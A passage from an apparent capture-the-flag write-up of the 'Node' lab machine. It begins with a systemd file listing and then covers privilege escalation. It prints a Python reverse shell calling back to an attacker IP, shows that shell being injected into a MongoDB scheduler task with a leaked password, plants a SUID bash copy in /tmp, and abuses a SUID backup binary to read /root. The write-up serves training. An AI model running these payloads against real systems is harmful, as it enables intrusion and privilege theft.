1 root root  731 Jul 19  2017 systemd-journal-flush.service<br/>-rw-r--r-- 1 root root  557 Jul 19  2017 systemd-kexec.service<br/>-rw-r--r-- 1 root root  691 Jul 19  2017 systemd-localed.service<br/>-rw-r--r-- 1 root root 1.2K Jul 19  2017 systemd-logind.service<br/>-rw-r--r-- 1 root root  693 Jul 19  2017 systemd-machine-id-commit.service<br/>-rw-r--r-- 1 root root  967 Jul 19  2017 systemd-modules-load.service<br/>-rw-r--r-- 1 root root 1.3K Jul 19  2017 systemd-networkd.service<br/>-rw-r--r-- 1 root root  591 Jul 19  2017 systemd-networkd.socket<br/>-rw-r--r-- 1 root root  685 Jul 19  2017 systemd-networkd-wait-online.service<br/>-rw-r--r-- 1 root root  553 Jul 19  2017 systemd-poweroff.service<br/>-rw-r--r-- 1 root root  614 Jul 19  2017 systemd-quotacheck.service<br/>-rw-r--r-- 1 root root  717 Jul 19  2017 systemd-random-seed.service<br/>-rw-r--r-- 1 root root  548 Jul 19  2017 systemd-reboot.service<br/>-rw-r--r-- 1 root root  757 Jul 19  2017 systemd-remount-fs.service<br/>-rw-r--r-- 1 root root  907 Jul 19  2017 systemd-resolved.service<br/>-rw-r--r-- 1 root root  696 Jul 19  2017 systemd-rfkill.service<br/>-rw-r--r-- 1 root root  617 Jul 19  2017 systemd-rfkill.socket<br/>-rw-r--r-- 1 root root  497 Jul 19  2017 systemd-suspend.service<br/>-rw-r--r-- 1 root root  649 Jul 19  2017 systemd-sysctl.service<br/>-rw-r--r-- 1 root root  655 Jul 19  2017 systemd-timedated.service<br/>-rw-r--r-- 1 root root 1.1K Jul 19  2017 systemd-timesyncd.service<br/>-rw-r--r-- 1 root root  598 Jul 19  2017 systemd-tmpfiles-clean.service<br/>-rw-r--r-- 1 root root  450 Jul 19  2017 systemd-tmpfiles-clean.timer<br/>-rw-r--r-- 1 root root  703 Jul 19  2017 systemd-tmpfiles-setup-dev.service<br/>-rw-r--r-- 1 root root  683 Jul 19  2017 systemd-tmpfiles-setup.service<br/>-rw-r--r-- 1 root root  578 Jul 19  2017 systemd-udevd-control.socket<br/>-rw-r--r-- 1 root root  570 Jul 19  2017 systemd-udevd-kernel.socket<br/>-rw-r--r-- 1 root root  825 Jul 19  2017 systemd-udevd.service<br/>-rw-r--r-- 1 root root  823 Jul 19  2017 systemd-udev-settle.service<br/>-rw-r--r-- 1 root root  743 Jul 19  2017 systemd-udev-trigger.service<br/>-rw-r--r-- 1 root root  757 Jul 19  2017 systemd-update-utmp-runlevel.service<br/>-rw-r--r-- 1 root root  754 Jul 19  2017 systemd-update-utmp.service<br/>-rw-r--r-- 1 root root  573 Jul 19  2017 systemd-user-sessions.service<br/>-rw-r--r-- 1 root root  436 Jul 19  2017 system.slice<br/>-rw-r--r-- 1 root root  585 Jul 19  2017 system-update.target<br/>-rw-r--r-- 1 root root  405 Jul 19  2017 timers.target<br/>-rw-r--r-- 1 root root  395 Jul 19  2017 time-sync.target<br/>-rw-r--r-- 1 root root  417 Jul 19  2017 umount.target<br/>-rw-r--r-- 1 root root  528 Jul 19  2017 user@.service<br/>-rw-r--r-- 1 root root  392 Jul 19  2017 user.slice<br/>-rw-r--r-- 1 root root  342 Jul 17  2017 getty-static.service<br/>-rw-r--r-- 1 root root  153 Jul 17  2017 sigpwr-container-shutdown.service<br/>-rw-r--r-- 1 root root  175 Jul 17  2017 systemd-networkd-resolvconf-update.path<br/>-rw-r--r-- 1 root root  715 Jul 17  2017 systemd-networkd-resolvconf-update.service<br/>-rw-r--r-- 1 root root  192 Jul 17  2017 snapd.autoimport.service<br/>-rw-r--r-- 1 root root  368 Jul 17  2017 snapd.core-fixup.service<br/>-rw-r--r-- 1 root root  290 Jul 17  2017 snapd.refresh.service<br/>-rw-r--r-- 1 root root  323 Jul 17  2017 snapd.refresh.timer<br/>-rw-r--r-- 1 root root  212 Jul 17  2017 snapd.service<br/>-rw-r--r-- 1 root root  281 Jul 17  2017 snapd.socket<br/>-rw-r--r-- 1 root root  474 Jul 17  2017 snapd.system-shutdown.service<br/>-rw-r--r-- 1 root root  642 Jul 14  2017 mongod.service<br/>-rw-r--r-- 1 root root  311 Jul  5  2017 lxcfs.service<br/>-rw-r--r-- 1 root root  169 Jun 19  2017 apt-daily.service<br/>-rw-r--r-- 1 root root  212 Jun 19  2017 apt-daily.timer<br/>-rw-r--r-- 1 root root  202 Jun 19  2017 apt-daily-upgrade.service<br/>-rw-r--r-- 1 root root  184 Jun 19  2017 apt-daily-upgrade.timer<br/>-rw-r--r-- 1 root root  189 Jun 14  2017 uuidd.service<br/>-rw-r--r-- 1 root root  126 Jun 14  2017 uuidd.socket<br/>-rw-r--r-- 1 root root  345 Apr 20  2017 unattended-upgrades.service<br/>-rw-r--r-- 1 root root  385 Mar 16  2017 ssh.service<br/>-rw-r--r-- 1 root root  196 Mar 16  2017 ssh@.service<br/>-rw-r--r-- 1 root root  216 Mar 16  2017 ssh.socket<br/>-rw-r--r-- 1 root root  269 Jan 31  2017 setvtrgb.service<br/>-rw-r--r-- 1 root root  491 Jan 12  2017 dbus.service<br/>-rw-r--r-- 1 root root  106 Jan 12  2017 dbus.socket<br/>-rw-r--r-- 1 root root  420 Dec  7  2016 resolvconf.service<br/>-rw-r--r-- 1 root root  735 Nov 30  2016 networking.service<br/>-rw-r--r-- 1 root root  497 Nov 30  2016 ifup@.service<br/>-rw-r--r-- 1 root root  631 Nov  3  2016 accounts-daemon.service<br/>-rw-r--r-- 1 root root  251 Sep 18  2016 open-vm-tools.service<br/>-rw-r--r-- 1 root root  285 Jun 16  2016 keyboard-setup.service<br/>-rw-r--r-- 1 root root  288 Jun 16  2016 console-setup.service<br/>lrwxrwxrwx 1 root root   27 May 10  2016 plymouth-log.service -&gt; plymouth-read-write.service<br/>lrwxrwxrwx 1 root root   21 May 10  2016 plymouth.service -&gt; plymouth-quit.service<br/>-rw-r--r-- 1 root root  412 May 10  2016 plymouth-halt.service<br/>-rw-r--r-- 1 root root  426 May 10  2016 plymouth-kexec.service<br/>-rw-r--r-- 1 root root  421 May 10  2016 plymouth-poweroff.service<br/>-rw-r--r-- 1 root root  194 May 10  2016 plymouth-quit.service<br/>-rw-r--r-- 1 root root  200 May 10  2016 plymouth-quit-wait.service<br/>-rw-r--r-- 1 root root  244 May 10  2016 plymouth-read-write.service<br/>-rw-r--r-- 1 root root  416 May 10  2016 plymouth-reboot.service<br/>-rw-r--r-- 1 root root  532 May 10  2016 plymouth-start.service<br/>-rw-r--r-- 1 root root  291 May 10  2016 plymouth-switch-root.service<br/>-rw-r--r-- 1 root root  490 May 10  2016 systemd-ask-password-plymouth.path<br/>-rw-r--r-- 1 root root  467 May 10  2016 systemd-ask-password-plymouth.service<br/>lrwxrwxrwx 1 root root    9 Apr 16  2016 lvm2.service -&gt; /dev/null<br/>-rw-r--r-- 1 root root  334 Apr 16  2016 dm-event.service<br/>-rw-r--r-- 1 root root  248 Apr 16  2016 dm-event.socket<br/>-rw-r--r-- 1 root root  380 Apr 16  2016 lvm2-lvmetad.service<br/>-rw-r--r-- 1 root root  215 Apr 16  2016 lvm2-lvmetad.socket<br/>-rw-r--r-- 1 root root  335 Apr 16  2016 lvm2-lvmpolld.service<br/>-rw-r--r-- 1 root root  213 Apr 16  2016 lvm2-lvmpolld.socket<br/>-rw-r--r-- 1 root root  658 Apr 16  2016 lvm2-monitor.service<br/>-rw-r--r-- 1 root root  382 Apr 16  2016 lvm2-pvscan@.service<br/>drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel1.target.wants<br/>drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel2.target.wants<br/>drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel3.target.wants<br/>drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel4.target.wants<br/>drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel5.target.wants<br/>-rw-r--r-- 1 root root  234 Apr  8  2016 acpid.service<br/>-rw-r--r-- 1 root root  251 Apr  5  2016 cron.service<br/>-rw-r--r-- 1 root root  290 Apr  5  2016 rsyslog.service<br/>-rw-r--r-- 1 root root  142 Mar 31  2016 apport-forward@.service<br/>-rw-r--r-- 1 root root  225 Mar 31  2016 apport-forward.socket<br/>-rw-r--r-- 1 root root  455 Mar 29  2016 iscsid.service<br/>-rw-r--r-- 1 root root 1.1K Mar 29  2016 open-iscsi.service<br/>-rw-r--r-- 1 root root  115 Feb  9  2016 acpid.socket<br/>-rw-r--r-- 1 root root  115 Feb  9  2016 acpid.path<br/>-rw-r--r-- 1 root root  169 Jan 14  2016 atd.service<br/>-rw-r--r-- 1 root root  182 Jan 14  2016 polkitd.service<br/>-rw-r--r-- 1 root root  790 Jun  1  2015 friendly-recovery.service<br/>-rw-r--r-- 1 root root  241 Mar  3  2015 ufw.service<br/>-rw-r--r-- 1 root root  250 Feb 24  2015 ureadahead-stop.service<br/>-rw-r--r-- 1 root root  242 Feb 24  2015 ureadahead-stop.timer<br/>-rw-r--r-- 1 root root  401 Feb 24  2015 ureadahead.service<br/>-rw-r--r-- 1 root root  188 Feb 24  2014 rsync.service<br/><br/>/lib/systemd/system/halt.target.wants:<br/>total 0<br/>lrwxrwxrwx 1 root root 24 May 10  2016 plymouth-halt.service -&gt; ../plymouth-halt.service<br/><br/>/lib/systemd/system/initrd-switch-root.target.wants:<br/>total 0<br/>lrwxrwxrwx 1 root root 25 May 10  2016 plymouth-start.service -&gt; ../plymouth-start.service<br/>lrwxrwxrwx 1 root root 31 May 10  2016 plymouth-switch-root.service -&gt; ../plymouth-switch-root.service<br/><br/>/lib/systemd/system/kexec.target.wants:<br/>total 0<br/>lrwxrwxrwx 1 root root 25 May 10  2016 plymouth-kexec.service -&gt; ../plymouth-kexec.service<br/><br/>/lib/systemd/system/multi-user.target.wants:<br/>total 0<br/>lrwxrwxrwx 1 root root 15 Aug 29  2017 getty.target -&gt; ../getty.target<br/>lrwxrwxrwx 1 root root 33 Aug 29  2017 systemd-ask-password-wall.path -&gt; ../systemd-ask-password-wall.path<br/>lrwxrwxrwx 1 root root 25 Aug 29  2017 systemd-logind.service -&gt; ../systemd-logind.service<br/>lrwxrwxrwx 1 root root 39 Aug 29  2017 systemd-update-utmp-runlevel.service -&gt; ../systemd-update-utmp-runlevel.service<br/>lrwxrwxrwx 1 root root 32 Aug 29  2017 systemd-user-sessions.service -&gt; ../systemd-user-sessions.service<br/>lrwxrwxrwx 1 root root 15 Jan 12  2017 dbus.service -&gt; ../dbus.service<br/>lrwxrwxrwx 1 root root 24 May 10  2016 plymouth-quit.service -&gt; ../plymouth-quit.service<br/>lrwxrwxrwx 1 root root 29 May 10  2016 plymouth-quit-wait.service -&gt; ../plymouth-quit-wait.service<br/><br/>/lib/systemd/system/poweroff.target.wants:<br/>total 0<br/>lrwxrwxrwx 1 root root 39 Aug 29  2017 systemd-update-utmp-runlevel.service -&gt; ../systemd-update-utmp-runlevel.service<br/>lrwxrwxrwx 1 root root 28 May 10  2016 plymouth-poweroff.service -&gt; ../plymouth-poweroff.service<br/><br/>/lib/systemd/system/reboot.target.wants:<br/>total 0<br/>lrwxrwxrwx 1 root root 39 Aug 29  2017 systemd-update-utmp-runlevel.service -&gt; ../systemd-update-utmp-runlevel.service<br/>lrwxrwxrwx 1 root root 26 May 10  2016 plymouth-reboot.service -&gt; ../plymouth-reboot.service<br/><br/>/lib/systemd/system/sysinit.target.wants:<br/>total 0<br/>lrwxrwxrwx 1 root root 24 Aug 29  2017 console-setup.service -&gt; ../console-setup.service<br/>lrwxrwxrwx 1 root root 20 Aug 29  2017 cryptsetup.target -&gt; ../cryptsetup.target<br/>lrwxrwxrwx 1 root root 22 Aug 29  2017 dev-hugepages.mount -&gt; ../dev-hugepages.mount<br/>lrwxrwxrwx 1 root root 19 Aug 29  2017 dev-mqueue.mount -&gt; ../dev-mqueue.mount<br/>lrwxrwxrwx 1 root root 25 Aug 29  2017 keyboard-setup.service -&gt; ../keyboard-setup.service<br/>lrwxrwxrwx 1 root root 28 Aug 29  2017 kmod-static-nodes.service -&gt; ../kmod-static-nodes.service<br/>lrwxrwxrwx 1 root root 36 Aug 29  2017 proc-sys-fs-binfmt_misc.automount -&gt; ../proc-sys-fs-binfmt_misc.automount<br/>lrwxrwxrwx 1 root root 19 Aug 29  2017 setvtrgb.service -&gt; ../setvtrgb.service<br/>lrwxrwxrwx 1 root root 32 Aug 29  2017 sys-fs-fuse-connections.mount -&gt; ../sys-fs-fuse-connections.mount<br/>lrwxrwxrwx 1 root root 26 Aug 29  2017 sys-kernel-config.mount -&gt; ../sys-kernel-config.mount<br/>lrwxrwxrwx 1 root root 25 Aug 29  2017 sys-kernel-debug.mount -&gt; ../sys-kernel-debug.mount<br/>lrwxrwxrwx 1 root root 36 Aug 29  2017 systemd-ask-password-console.path -&gt; ../systemd-ask-password-console.path<br/>lrwxrwxrwx 1 root root 25 Aug 29  2017 systemd-binfmt.service -&gt; ../systemd-binfmt.service<br/>lrwxrwxrwx 1 root root 30 Aug 29  2017 systemd-hwdb-update.service -&gt; ../systemd-hwdb-update.service<br/>lrwxrwxrwx 1 root root 27 Aug 29  2017 systemd-journald.service -&gt; ../systemd-journald.service<br/>lrwxrwxrwx 1 root root 32 Aug 29  2017 systemd-journal-flush.service -&gt; ../systemd-journal-flush.service<br/>lrwxrwxrwx 1 root root 36 Aug 29  2017 systemd-machine-id-commit.service -&gt; ../systemd-machine-id-commit.service<br/>lrwxrwxrwx 1 root root 31 Aug 29  2017 systemd-modules-load.service -&gt; ../systemd-modules-load.service<br/>lrwxrwxrwx 1 root root 30 Aug 29  2017 systemd-random-seed.service -&gt; ../systemd-random-seed.service<br/>lrwxrwxrwx 1 root root 25 Aug 29  2017 systemd-sysctl.service -&gt; ../systemd-sysctl.service<br/>lrwxrwxrwx 1 root root 37 Aug 29  2017 systemd-tmpfiles-setup-dev.service -&gt; ../systemd-tmpfiles-setup-dev.service<br/>lrwxrwxrwx 1 root root 33 Aug 29  2017 systemd-tmpfiles-setup.service -&gt; ../systemd-tmpfiles-setup.service<br/>lrwxrwxrwx 1 root root 24 Aug 29  2017 systemd-udevd.service -&gt; ../systemd-udevd.service<br/>lrwxrwxrwx 1 root root 31 Aug 29  2017 systemd-udev-trigger.service -&gt; ../systemd-udev-trigger.service<br/>lrwxrwxrwx 1 root root 30 Aug 29  2017 systemd-update-utmp.service -&gt; ../systemd-update-utmp.service<br/>lrwxrwxrwx 1 root root 30 May 10  2016 plymouth-read-write.service -&gt; ../plymouth-read-write.service<br/>lrwxrwxrwx 1 root root 25 May 10  2016 plymouth-start.service -&gt; ../plymouth-start.service<br/><br/>/lib/systemd/system/sockets.target.wants:<br/>total 0<br/>lrwxrwxrwx 1 root root 25 Aug 29  2017 systemd-initctl.socket -&gt; ../systemd-initctl.socket<br/>lrwxrwxrwx 1 root root 32 Aug 29  2017 systemd-journald-audit.socket -&gt; ../systemd-journald-audit.socket<br/>lrwxrwxrwx 1 root root 34 Aug 29  2017 systemd-journald-dev-log.socket -&gt; ../systemd-journald-dev-log.socket<br/>lrwxrwxrwx 1 root root 26 Aug 29  2017 systemd-journald.socket -&gt; ../systemd-journald.socket<br/>lrwxrwxrwx 1 root root 31 Aug 29  2017 systemd-udevd-control.socket -&gt; ../systemd-udevd-control.socket<br/>lrwxrwxrwx 1 root root 30 Aug 29  2017 systemd-udevd-kernel.socket -&gt; ../systemd-udevd-kernel.socket<br/>lrwxrwxrwx 1 root root 14 Jan 12  2017 dbus.socket -&gt; ../dbus.socket<br/><br/>/lib/systemd/system/sigpwr.target.wants:<br/>total 0<br/>lrwxrwxrwx 1 root root 36 Aug 29  2017 sigpwr-container-shutdown.service -&gt; ../sigpwr-container-shutdown.service<br/><br/>/lib/systemd/system/systemd-resolved.service.d:<br/>total 4.0K<br/>-rw-r--r-- 1 root root 200 Jul 17  2017 resolvconf.conf<br/><br/>/lib/systemd/system/systemd-timesyncd.service.d:<br/>total 4.0K<br/>-rw-r--r-- 1 root root 251 Jul  5  2017 disable-with-time-daemon.conf<br/><br/>/lib/systemd/system/timers.target.wants:<br/>total 0<br/>lrwxrwxrwx 1 root root 31 Aug 29  2017 systemd-tmpfiles-clean.timer -&gt; ../systemd-tmpfiles-clean.timer<br/><br/>/lib/systemd/system/local-fs.target.wants:<br/>total 0<br/>lrwxrwxrwx 1 root root 29 Aug 29  2017 systemd-remount-fs.service -&gt; ../systemd-remount-fs.service<br/><br/>/lib/systemd/system/rc-local.service.d:<br/>total 4.0K<br/>-rw-r--r-- 1 root root 290 Jul  5  2017 debian.conf<br/><br/>/lib/systemd/system/rescue.target.wants:<br/>total 0<br/>lrwxrwxrwx 1 root root 39 Aug 29  2017 systemd-update-utmp-runlevel.service -&gt; ../systemd-update-utmp-runlevel.service<br/><br/>/lib/systemd/system/resolvconf.service.wants:<br/>total 0<br/>lrwxrwxrwx 1 root root 42 Aug 29  2017 systemd-networkd-resolvconf-update.path -&gt; ../systemd-networkd-resolvconf-update.path<br/><br/>/lib/systemd/system/getty.target.wants:<br/>total 0<br/>lrwxrwxrwx 1 root root 23 Aug 29  2017 getty-static.service -&gt; ../getty-static.service<br/><br/>/lib/systemd/system/graphical.target.wants:<br/>total 0<br/>lrwxrwxrwx 1 root root 39 Aug 29  2017 systemd-update-utmp-runlevel.service -&gt; ../systemd-update-utmp-runlevel.service<br/><br/>/lib/systemd/system/busnames.target.wants:<br/>total 0<br/><br/>/lib/systemd/system/runlevel1.target.wants:<br/>total 0<br/><br/>/lib/systemd/system/runlevel2.target.wants:<br/>total 0<br/><br/>/lib/systemd/system/runlevel3.target.wants:<br/>total 0<br/><br/>/lib/systemd/system/runlevel4.target.wants:<br/>total 0<br/><br/>/lib/systemd/system/runlevel5.target.wants:<br/>total 0<br/><br/>/lib/systemd/system-sleep:<br/>total 4.0K<br/>-rwxr-xr-x 1 root root 92 Mar 17  2016 hdparm<br/><br/>/lib/systemd/system-generators:<br/>total 680K<br/>-rwxr-xr-x 1 root root  71K Jul 19  2017 systemd-cryptsetup-generator<br/>-rwxr-xr-x 1 root root  59K Jul 19  2017 systemd-dbus1-generator<br/>-rwxr-xr-x 1 root root  43K Jul 19  2017 systemd-debug-generator<br/>-rwxr-xr-x 1 root root  79K Jul 19  2017 systemd-fstab-generator<br/>-rwxr-xr-x 1 root root  39K Jul 19  2017 systemd-getty-generator<br/>-rwxr-xr-x 1 root root 119K Jul 19  2017 systemd-gpt-auto-generator<br/>-rwxr-xr-x 1 root root  39K Jul 19  2017 systemd-hibernate-resume-generator<br/>-rwxr-xr-x 1 root root  39K Jul 19  2017 systemd-insserv-generator<br/>-rwxr-xr-x 1 root root  35K Jul 19  2017 systemd-rc-local-generator<br/>-rwxr-xr-x 1 root root  31K Jul 19  2017 systemd-system-update-generator<br/>-rwxr-xr-x 1 root root 103K Jul 19  2017 systemd-sysv-generator<br/>-rwxr-xr-x 1 root root  11K Apr 16  2016 lvm2-activation-generator<br/><br/>/lib/systemd/system-preset:<br/>total 4.0K<br/>-rw-r--r-- 1 root root 869 Jul 19  2017 90-systemd.preset<br/><br/>/lib/systemd/network:<br/>total 12K<br/>-rw-r--r-- 1 root root 404 Jul 19  2017 80-container-host0.network<br/>-rw-r--r-- 1 root root 482 Jul 19  2017 80-container-ve.network<br/>-rw-r--r-- 1 root root  80 Jul 19  2017 99-default.link<br/><br/>/lib/systemd/system-shutdown:<br/>total 0<br/></h2></div>
<div class="page" id="Interesting Files"><h1><b><u>Interesting Files</u></b></h1><img alt="images/816-1.png" src="images/816-1.png"/><br/><img alt="images/816-2.png" src="images/816-2.png"/><br/><br/><img alt="images/816-3.png" src="images/816-3.png"/><br/><br/><img alt="images/816-4.png" src="images/816-4.png"/><br/><img alt="images/816-5.png" src="images/816-5.png"/><br/></div>
<div class="page" id="LinEnum finds:"><h1><b><u>LinEnum finds:</u></b></h1><span style="color:#24ff00;">from the networking portion of the report we see a port listening on node's localhost <br/></span><img alt="images/814-1.png" src="images/814-1.png"/><br/><br/>processes owned and ran by <span style="color:#ffff00;">Tom</span><span style="color:#24ff00;">:</span><br/><img alt="images/814-2.png" src="images/814-2.png"/><br/><img alt="images/814-3.png" src="images/814-3.png"/><br/><img alt="images/814-4.png" src="images/814-4.png"/><br/><br/><br/></div>
<div class="page" id="escalation method 1: mongo_db rev shell"><h1><b><u>escalation method 1: mongo_db rev shell</u></b></h1><span style="color:#24ff00;">First, here's a diagram on how </span><span style="color:#ffa500;">mongodb</span><span style="color:#24ff00;"> works courtesy of </span><span style="color:#ffff00;">Rana Khalil</span><span style="color:#24ff00;">!</span><br/><br/><img alt="images/817-1.png" src="images/817-1.png"/><br/><span style="color:#24ff00;">we can see based off tom's owned and ran processes that </span><span style="color:#ffa500;">/var/scheduler</span><span style="color:#24ff00;"> has a javascript file</span><span style="color:#ffa500;"> app.js </span><span style="color:#24ff00;">that may help us out:<br/><br/>no credentials besides mark again but we see that the scheulded function goes into the scheduler database and runs all the tasks within it, we may be able to remote back to our attacking machine if we inject a reverse_shell to be ran through the scheduler</span><br/><img alt="images/817-2.png" src="images/817-2.png"/></div>
<div class="page" id="pentest monkey reverse shell "><h1><b><u>pentest monkey reverse shell </u></b></h1><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentest monkey reverse shell cheat sheet</a><br/><img alt="images/819-1.png" src="images/819-1.png"/><br/><span style="color:#24ff00;">tweak it so it points back to us: </span><br/><span style="color:#ffa500;">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.62",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'<br/></span><br/><span style="color:#24ff00;">now we'll need to insert this command within the </span><span style="color:#ffa500;">mongo_db </span><span style="color:#24ff00;">and execute it </span><br/></div>
<div class="page" id="excalating to Tom w/ reverse shell"><h1><b><u>excalating to Tom w/ reverse shell</u></b></h1><span style="color:#24ff00;">Lets attempt to connect to Node's </span><span style="color:#ffa500;">mongo database </span><span style="color:#24ff00;">and escalate to Tom<br/><br/>- we have mark's password 5AYRft73VtFpc84k<br/>- we also know from the Networking report off of our LinEnum.sh script that MongoDB is running off Node's localhost on port 27017</span><br/><br/><span style="color:#ffa500;">mongo -u mark -p 5AYRft73VtFpc84k localhost:27017/scheduler</span><br/><img alt="images/818-1.png" src="images/818-1.png"/><br/><span style="color:#24ff00;">we're in!<br/>now to upload our </span><span style="color:#ffff00;">reverse shell</span><span style="color:#24ff00;"> as a document:</span><br/><br/><span style="color:#ffa500;">db.tasks.find()</span><br/><img alt="images/818-2.png" src="images/818-2.png"/><br/><span style="color:#24ff00;">we see there are no tasks at the moment so lets add one with a python reverse shell from pentest monkey</span><br/><br/><span style="color:#24ff00;">keep in mind mongo likes commands inserted in </span><span style="color:#ffff00;">json</span><span style="color:#24ff00;"> format:</span><br/><span style="color:#ffa500;">db.tasks.insert({cmd: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.62\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"})</span><br/><br/><br/><img alt="images/818-3.png" src="images/818-3.png"/><br/><br/><span style="color:#24ff00;">finally, set up a listener on our attack machine and wait for mongo to execute it </span><br/><img alt="images/818-4.png" src="images/818-4.png"/><br/></div>
<div class="page" id="escalating method 2: copy privileged shell (ippsec)"><h1><b><u>escalating method 2: copy privileged shell (ippsec)</u></b></h1><span style="color:#24ff00;">we can also </span><span style="color:#ffff00;">priv esc</span><span style="color:#24ff00;"> by copying a privileged shell over in a mongodb </span><span style="color:#ffa500;">insert</span> <span style="color:#24ff00;">command</span><br/><br/><span style="color:#24ff00;">copying bash over to the </span><span style="color:#ffa500;">/tmp</span><span style="color:#24ff00;"> directory with chmod designated privileges is what ippsec did:</span><br/><span style="color:#ffa500;">db.tasks.insert({cmd: "cp /bin/bash /tmp/st0ve; chmod u+s /tmp/st0ve;"})</span><br/><img alt="images/822-1.png" src="images/822-1.png"/><br/><img alt="images/822-2.png" src="images/822-2.png"/><br/><br/><span style="color:#24ff00;">why we use </span><span style="color:#ffa500;">chmod u+s </span><span style="color:#24ff00;">:</span><br/><img alt="images/822-3.png" src="images/822-3.png"/><br/><br/><img alt="images/822-4.png" src="images/822-4.png"/><br/><br/><span style="color:#24ff00;">tom owns it because tom owns the schduler: we can confirm with </span><span style="color:#ffa500;">ps aux | grep schedule</span><br/><img alt="images/822-5.png" src="images/822-5.png"/><br/><br/><span style="color:#24ff00;">now we see our </span><span style="color:#ffa500;">EUID</span><span style="color:#24ff00;"> is </span><span style="color:#ffff00;">tom</span><br/><img alt="images/822-6.png" src="images/822-6.png"/><br/><br/></div>
<div class="page" id="privesc to root"><h1><b><u>privesc to root</u></b></h1></div>
<div class="page" id="find / -perm -4000 2&gt;/dev/null"><h1><b><u>find / -perm -4000 2&gt;/dev/null</u></b></h1><span style="color:#ffa500;">find / -perm -4000 2&gt;/dev/null</span><br/> <span style="color:#24ff00;">will show us what other processes have</span> <span style="color:#ffa500;">Set UID </span><span style="color:#24ff00;">bits active on them</span><br/><img alt="images/820-1.png" src="images/820-1.png"/><br/><br/><img alt="images/820-2.png" src="images/820-2.png"/><br/><span style="color:#ffa500;">/usr/local/bin/backup </span><span style="color:#24ff00;">is a file worth looking into from here</span><br/></div>
<div class="page" id="/usr/local/bin/backup"><h1><b><u>/usr/local/bin/backup</u></b></h1><span style="color:#24ff00;">lets xfer the backup file to our attacking machine<br/></span><img alt="images/829-1.png" src="images/829-1.png"/><br/><br/><img alt="images/829-2.png" src="images/829-2.png"/><br/><br/>we see the md5 sums match verifying we transfered the correct file</div>
<div class="page" id="strace ./backup"><h1><b><u>strace ./backup</u></b></h1><span style="color:#ffa500;">strace</span><span style="color:#24ff00;"> is a diagnostic, debugging and instructional userspace utility for Linux. It is used to monitor and tamper with interactions between processes and the Linux kernel, which include </span><span style="color:#ffa500;">system calls</span><span style="color:#24ff00;">, </span><span style="color:#ffa500;">signal deliveries</span><span style="color:#24ff00;">, and </span><span style="color:#ffa500;">changes of process state</span><span style="color:#24ff00;">. The operation of </span><span style="color:#ffa500;">strace</span><span style="color:#24ff00;"> is made possible by the kernel feature known as ptrace.<br/><br/>we'll run it against the </span><span style="color:#ffa500;">./backup</span><span style="color:#24ff00;"> process we downloaded off our victim machine<br/></span><img alt="images/830-1.png" src="images/830-1.png"/></div>
<div class="page" id="radar 2"><h1><b><u>radar 2</u></b></h1><span style="color:#24ff00;">time to follow the binary (ippsec)<br/><br/>analyze with </span><span style="color:#ffa500;">aaa</span><br/><img alt="images/831-1.png" src="images/831-1.png"/><br/>print out function list with <span style="color:#ffa500;">afl</span><span style="color:#24ff00;"><br/><br/></span><img alt="images/831-2.png" src="images/831-2.png"/>v<img alt="images/831-3.png" src="images/831-3.png"/><br/><br/><span style="color:#ffa500;">vvv</span><span style="color:#24ff00;"> to handle visualization mode<br/><br/><br/></span></div>
<div class="page" id="takes 3 arguments"><h1><b><u>takes 3 arguments</u></b></h1><br/><img alt="images/832-1.png" src="images/832-1.png"/><br/>we see if backpup doesnt have 3 arguments it immedately closes:<br/><br/><img alt="images/832-2.png" src="images/832-2.png"/></div>
<div class="page" id="strace"><h1><b><u>strace</u></b></h1><span style="color:#24ff00;">when we run strace on the file we see it looks for keys from the </span><span style="color:#ffa500;">/etc/myplace/keys </span><span style="color:#24ff00;">folder <br/></span><img alt="images/833-1.png" src="images/833-1.png"/><br/><br/><img alt="images/833-2.png" src="images/833-2.png"/><br/><br/>and when we look at node we see that folder contains <span style="color:#ffff00;">3 keys</span><span style="color:#24ff00;"> <br/><br/></span><img alt="images/833-3.png" src="images/833-3.png"/><br/><span style="color:#ffff00;">a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508<br/>45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474<br/>3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110<br/></span></div>
<div class="page" id="./backup (trolled)"><h1><b><u>./backup (trolled)</u></b></h1><span style="color:#24ff00;">the app.js file shows us there are 3 arguments we need to run the backup process</span><img alt="images/827-1.png" src="images/827-1.png"/><br/><img alt="images/827-2.png" src="images/827-2.png"/><br/><br/>and we can find the backup keys in the /etc/myplace/keys<br/><img alt="images/827-3.png" src="images/827-3.png"/><br/><span style="color:#ffff00;">a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508<br/>45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474<br/>3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110</span><span style="color:#24ff00;"><br/><br/><br/><br/><br/>given these variables, the code we want <br/></span><strong><span style="color:#ffa500;">./backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root</span></strong><span style="color:#24ff00;"><br/><br/><br/><br/>we get this output <br/></span><img alt="images/827-4.png" src="images/827-4.png"/><br/><br/>lets put this into a file and decode it<br/><img alt="images/827-5.png" src="images/827-5.png"/><br/><img alt="images/827-6.png" src="images/827-6.png"/><br/><img alt="images/827-7.png" src="images/827-7.png"/><br/><br/>didnt work lets try 7zip<br/><img alt="images/827-8.png" src="images/827-8.png"/><br/><img alt="images/827-9.png" src="images/827-9.png"/> we get a password prompt, lets use magicword<br/><br/>we see we have<span style="color:#ffff00;"> root.txt</span><span style="color:#24ff00;"> in our folder! lets open it and see...<br/></span><img alt="images/827-10.png" 